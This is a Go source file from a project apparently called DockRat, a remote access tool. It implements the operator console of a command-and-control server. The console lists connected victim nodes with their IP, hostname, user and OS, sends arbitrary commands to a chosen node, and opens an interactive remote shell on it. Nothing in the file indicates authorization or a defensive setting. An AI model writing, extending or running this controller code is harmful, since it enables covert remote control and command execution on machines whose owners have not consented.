package protocol

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/Singert/DockRat/core/node"
)

func StartConsole(registry *node.Registry) {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("(admin) >> ")
		if !scanner.Scan() {
			break
		}
		input := strings.TrimSpace(scanner.Text())
		if input == "" {
			continue
		}

		tokens := strings.SplitN(input, " ", 2)
		cmd := tokens[0]
		arg := ""
		if len(tokens) > 1 {
			arg = tokens[1]
		}

		switch cmd {
		case "detail":
			handleDetail(registry)
		case "exec":
			handleExec(arg, registry)
		case "shell":
			handleShell(arg, registry)
		default:
			fmt.Println("[-] Unknown command")
		}
	}
}

func handleDetail(reg *node.Registry) {
	nodes := reg.List()
	fmt.Println("[+] Connected nodes:")
	for _, n := range nodes {
		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s\n",
			n.ID, n.Addr, n.Hostname, n.Username, n.OS)
	}
}

func handleExec(arg string, reg *node.Registry) {
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) != 2 {
		fmt.Println("[-] Usage: exec <node_id> <command>")
		return
	}
	id := parts[0]
	cmdStr := parts[1]
	var nid int
	fmt.Sscanf(id, "%d", &nid)
	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}
	cmdPayload := map[string]string{"cmd": cmdStr}
	data, _ := json.Marshal(cmdPayload)
	msg := Message{
		Type:    MsgCommand,
		Payload: data,
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Encode failed:", err)
		return
	}
	_, err = n.Conn.Write(buf)
	if err != nil {
		fmt.Println("[-] Send failed:", err)
		return
	}
}

func handleShell(arg string, reg *node.Registry) {
	var nid int
	fmt.Sscanf(arg, "%d", &nid)
	n, ok := reg.Get(nid)
	if !ok {
		fmt.Println("[-] No such node")
		return
	}
	msg := Message{
		Type:    MsgShell,
		Payload: []byte("start shell"),
	}
	buf, err := EncodeMessage(msg)
	if err != nil {
		fmt.Println("[-] Encode failed:", err)
		return
	}
	_, err = n.Conn.Write(buf)
	if err != nil {
		fmt.Println("[-] Send failed:", err)
		return
	}
	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
	inputScanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("remote$ ")
		if !inputScanner.Scan() {
			break
		}
		line := inputScanner.Text()
		if strings.TrimSpace(line) == "exit" {
			fmt.Println("[*] Exiting shell mode.")
			break
		}
		cmdMsg := Message{
			Type:    MsgShell,
			Payload: []byte(line + "\n"),
		}
		buf, err := EncodeMessage(cmdMsg)
		if err != nil {
			fmt.Println("[-] Shell encode error:", err)
			break
		}
		_, err = n.Conn.Write(buf)
		if err != nil {
			fmt.Println("[-] Shell write error:", err)
			break
		}
	}
}
